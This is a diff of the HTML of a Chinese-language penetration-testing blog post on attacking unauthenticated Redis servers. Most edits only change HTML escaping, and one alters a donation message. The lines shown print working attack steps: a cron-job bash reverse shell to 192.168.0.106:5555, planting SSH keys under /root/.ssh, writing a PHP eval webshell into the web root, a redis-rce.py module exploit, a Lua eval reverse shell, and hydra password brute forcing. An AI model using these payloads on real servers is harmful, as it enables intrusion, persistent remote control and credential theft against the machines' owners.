@@ -549,7 +549,7 @@ config get dbfilename
 save  <span class="token comment" spellcheck="true"># 保存数据到备份路径(dir+dbfilename)</span>
 
 <span class="token comment" spellcheck="true"># 设置备份路径</span>
-config <span class="token keyword">set</span> <span class="token function">dir</span> /root/ <span class="token comment" spellcheck="true"># 可以移动到root，然后访问（如果能访问，就是root权限 -->可用来判断权限）</span>
+config <span class="token keyword">set</span> <span class="token function">dir</span> /root/ <span class="token comment" spellcheck="true"># 可以移动到root，然后访问（如果能访问，就是root权限 --&gt;可用来判断权限）</span>
 
 <span class="token comment" spellcheck="true"># 设置备份文件名</span>
 config <span class="token keyword">set</span> dbfilename filename
@@ -570,7 +570,7 @@ save
 <pre class="line-numbers language-bash"><code class="language-bash">nc -lvvp 4444
 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>2.利用redis生成计划任务配置文件</p>
-<pre class="line-numbers language-bash"><code class="language-bash"><span class="token keyword">set</span> -.- <span class="token string">"\n\n\n* * * * * bash -i >&amp; /dev/tcp/192.168.0.106/5555 0>&amp;1\n\n\n"</span>
+<pre class="line-numbers language-bash"><code class="language-bash"><span class="token keyword">set</span> -.- <span class="token string">"\n\n\n* * * * * bash -i &gt;&amp; /dev/tcp/192.168.0.106/5555 0&gt;&amp;1\n\n\n"</span>
 config <span class="token keyword">set</span> <span class="token function">dir</span> /var/spool/cron/
 config <span class="token keyword">set</span> dbfilename root
 save
@@ -583,7 +583,7 @@ save
 <pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># 本机先生成密钥</span>
 ssh-keygen -t rsa
 <span class="token comment" spellcheck="true"># 公钥内容导入key.txt文件</span>
-<span class="token punctuation">(</span>echo -e <span class="token string">"\n\n"</span><span class="token punctuation">;</span> <span class="token function">cat</span> /root/.ssh/id_rsa.pub<span class="token punctuation">;</span> <span class="token keyword">echo</span> -e <span class="token string">"\n\n"</span><span class="token punctuation">)</span> <span class="token operator">></span> key.txt
+<span class="token punctuation">(</span>echo -e <span class="token string">"\n\n"</span><span class="token punctuation">;</span> <span class="token function">cat</span> /root/.ssh/id_rsa.pub<span class="token punctuation">;</span> <span class="token keyword">echo</span> -e <span class="token string">"\n\n"</span><span class="token punctuation">)</span> <span class="token operator">&gt;</span> key.txt
 
 <span class="token comment" spellcheck="true">#</span>
 config <span class="token keyword">set</span> <span class="token function">dir</span> /root/.ssh/
@@ -601,7 +601,7 @@ save
 </blockquote>
 <pre class="line-numbers language-bash"><code class="language-bash">config <span class="token keyword">set</span> <span class="token function">dir</span> /var/www/html/    <span class="token comment" spellcheck="true"># 需要知道网站的绝对路径</span>
 config <span class="token keyword">set</span> dbfilename 1.php
-<span class="token keyword">set</span> 1 <span class="token string">"&lt;?php eval(<span class="token variable">$_POST</span>[1]); ?>"</span>
+<span class="token keyword">set</span> 1 <span class="token string">"&lt;?php eval(<span class="token variable">$_POST</span>[1]); ?&gt;"</span>
 save
 
 <span class="token comment" spellcheck="true"># 访问webshell</span>
@@ -654,7 +654,7 @@ save
 <span class="token function">make</span>
 
 <span class="token comment" spellcheck="true"># 运行sss</span>
-python redis-rce.py -r <span class="token operator">&lt;</span>目标地址<span class="token operator">></span>  -L <span class="token operator">&lt;</span>本机地址<span class="token operator">></span> -f module.so
+python redis-rce.py -r <span class="token operator">&lt;</span>目标地址<span class="token operator">&gt;</span>  -L <span class="token operator">&lt;</span>本机地址<span class="token operator">&gt;</span> -f module.so
 <span class="token comment" spellcheck="true"># 执行成功后可以选择生成一个交互的shell，或者重新反弹一个shell</span>
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <h6 id="2-反序列化rce"><a href="#2-反序列化rce" class="headerlink" title="2.反序列化rce"></a>2.反序列化rce</h6><p>当遇到 redis 服务器写文件无法 getshell，可以查看redis数据是否符合序列化数据的特征。</p>
@@ -672,7 +672,7 @@ jdk：首先看 value 是不是 base64，如果是解码后看里面有没有 ja
 <p><img src="http://image.xpshuai.cn/20200526092701919_308935847.png"></p>
 <p>运行exp</p>
 <p>执行成功后就可以进行命令执行了，这里反弹shell</p>
-<pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">eval</span> <span class="token string">"tonumber('/bin/bash -i >&amp; /dev/tcp/192.168.0.105/5555 0>&amp;1', 8)"</span> 0
+<pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">eval</span> <span class="token string">"tonumber('/bin/bash -i &gt;&amp; /dev/tcp/192.168.0.105/5555 0&gt;&amp;1', 8)"</span> 0
 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <h4 id="三、redis密码爆破"><a href="#三、redis密码爆破" class="headerlink" title="三、redis密码爆破"></a>三、redis密码爆破</h4><p>1.使用redis-cli连接，使用-a参数指定密码操作。</p>
 <pre class="line-numbers language-bash"><code class="language-bash">redir-cli -h 192.168.0.100 -a admin123
@@ -913,7 +913,7 @@ hydra -P redis_pass.txt redis://192.168.0.100
     <div id="rewardModal" class="modal">
         <div class="modal-content">
             <a class="close modal-close"><i class="fas fa-times"></i></a>
-            <h4 class="reward-title">你的赏识是我前进的动力</h4>
+            <h4 class="reward-title">如果感觉对您有帮助，请我吃包辣条吧</h4>
             <div class="reward-content">
                 <div class="reward-tabs">
                     <ul class="tabs row">
@@ -1272,7 +1272,7 @@ hydra -P redis_pass.txt redis://192.168.0.100
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">355k</span>&nbsp;字
+                class="white-color">358.6k</span>&nbsp;字
             
             
             
